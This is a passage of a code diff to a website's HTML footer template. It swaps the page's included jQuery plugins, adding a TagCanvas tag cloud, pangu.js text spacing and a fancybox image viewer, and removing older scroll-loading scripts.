+</script>
+
+
+<!--[if lt IE 9]><script src="/js/excanvas.js"></script><![endif]-->
+<script src="/js/jquery.tagcanvas.min.js"></script>
+ <script type="text/javascript">
+ $(document).ready(function() {
+   if( ! $('#myCanvas').tagcanvas({
+     textColour : '#6d6d6d',
+     outlineThickness : 1,
+     textHeight: 20,
+     maxSpeed : 0.04,
+     depth : 0.75
+   })) {
+     // TagCanvas failed to load
+     $('#myCanvasContainer').hide();
+   }
+   // your other jQuery stuff here...
+ });
+ </script>
+
+
+<script src="/js/pangu.js"></script>
+<script>pangu.page_spacing();</script>
 
 
 
-    
-        <script src="/vendor/fancybox/jquery.fancybox.pack.js"></script>
-    
-
-    
-        <script src="/vendor/scrollLoading/jquery.scrollLoading.js"></script>
-        <script src="/vendor/scrollLoading/main.js"></script>
-    
+<script src="/js/jquery.imagesloaded.min.js"></script>
 
 
-<!-- Custom Scripts -->
-<script src="/js/main.js"></script>
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
 
-    </div>
+
+
 </body>
 </html>
